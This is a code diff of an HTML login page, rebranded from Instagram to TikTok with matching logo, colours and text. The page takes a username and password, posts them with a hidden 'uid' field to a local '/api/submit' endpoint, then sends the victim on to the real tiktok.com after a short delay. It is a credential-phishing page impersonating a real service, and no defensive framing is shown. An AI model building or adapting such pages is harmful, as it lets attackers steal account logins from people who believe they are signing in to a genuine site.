@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Instagram Login</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&family=Great+Vibes&display=swap" rel="stylesheet">
+  <title>TikTok Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
 
   <style>
     body {
-      background-color: #fafafa;
+      background-color: #000;
       font-family: 'Roboto', sans-serif;
       display: flex;
       flex-direction: column;
@@ -19,24 +19,25 @@
     }
 
     .login-box {
-      background-color: #fff;
-      border: 1px solid #dbdbdb;
+      background-color: #111;
+      border: 1px solid #222;
       padding: 40px 30px;
-      border-radius: 8px;
+      border-radius: 10px;
       width: 340px;
       text-align: center;
+      box-shadow: 0 0 10px #f00;
     }
 
     .logo {
-      width: 90px;
-      margin-bottom: 10px;
+      width: 60px;
+      margin-bottom: 15px;
     }
 
     .brand-name {
-      font-family: 'Great Vibes', cursive;
-      font-size: 36px;
-      margin-bottom: 20px;
-      color: #262626;
+      font-size: 28px;
+      font-weight: bold;
+      margin-bottom: 25px;
+      color: #fff;
     }
 
     input, button {
@@ -48,12 +49,13 @@
     }
 
     input {
-      border: 1px solid #dbdbdb;
-      background-color: #fafafa;
+      border: 1px solid #333;
+      background-color: #222;
+      color: #eee;
     }
 
     button {
-      background-color: #3897f0;
+      background-color: #ff0050;
       color: white;
       font-weight: bold;
       border: none;
@@ -61,7 +63,7 @@
     }
 
     button:hover {
-      background-color: #318ce7;
+      background-color: #e60047;
     }
 
     .credit {
@@ -74,11 +76,11 @@
 <body>
 
   <div class="login-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo" />
-    <div class="brand-name">Instagram</div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/09/TikTok_logo.svg" alt="TikTok Logo" class="logo" />
+    <div class="brand-name">TikTok</div>
 
     <form method="POST" action="/api/submit" id="loginForm">
-      <input type="text" name="username" placeholder="Phone number, username or email" required />
+      <input type="text" name="username" placeholder="Email / Phone / Username" required />
       <input type="password" name="password" placeholder="Password" required />
       <input type="hidden" name="uid" id="uid" />
       <button type="submit">Log In</button>
@@ -101,7 +103,7 @@
 
     document.getElementById('loginForm').addEventListener('submit', function() {
       setTimeout(() => {
-        window.location.href = "https://instagram.com";
+        window.location.href = "https://tiktok.com";
       }, 1500);
     });
   </script>
